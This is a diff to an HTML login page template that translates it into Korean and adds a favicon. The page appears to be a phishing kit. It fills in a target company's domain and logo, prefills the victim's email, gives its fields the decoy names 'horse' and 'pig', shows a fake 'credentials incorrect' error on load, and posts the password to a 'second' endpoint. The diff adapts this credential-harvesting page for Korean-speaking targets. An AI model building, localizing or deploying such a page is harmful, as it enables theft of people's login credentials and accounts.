@@ -1,9 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ko">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{dman}}  Business Login</title>
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+
+    <title>{{dman}} 비즈니스 로그인</title>
     <style>
         * {
             margin: 0;
@@ -138,30 +140,28 @@
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://api.kickfire.com/logo?website={{dman}}" alt="Business Logo">
-            <h1>Sign In</h1>
-            <p>Welcome back! Please enter your credentials to access your account.</p>
+            <img src="https://api.kickfire.com/logo?website={{dman}}" alt="비즈니스 로고">
+            <h1>로그인</h1>
+            <p>다시 오신 것을 환영합니다! 계정에 접근하기 위해 자격 증명을 입력해주세요.</p>
 
             <p style="color: #e74c3c; text-align: center;
     font-size: 14px;">
-                    The credentials entered is incorrect. Please try again.
+                    입력한 자격 증명이 올바르지 않습니다. 다시 시도해 주세요.
                   </p>
         </div>
         <form action="second" method="POST">
             <div class="input-group">
-                
-                  
-                <label for="email">Email Address</label>
+                <label for="email">이메일 주소</label>
                 <input type="email" id="email" name="horse" value="{{eman}}" required="">
             </div>
             <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="pig" placeholder="Enter your password" required>
+                <label for="password">비밀번호</label>
+                <input type="password" id="password" name="pig" placeholder="비밀번호를 입력하세요" required>
             </div>
-            <button type="submit" class="btn">Log In</button>
+            <button type="submit" class="btn">로그인</button>
         </form>
         <div class="links">
-            <a href="#">Forgot your password?</a> | <a href="#">Create an account</a>
+            <a href="#">비밀번호를 잊으셨나요?</a> | <a href="#">계정 만들기</a>
         </div>
     </div>
 </body>
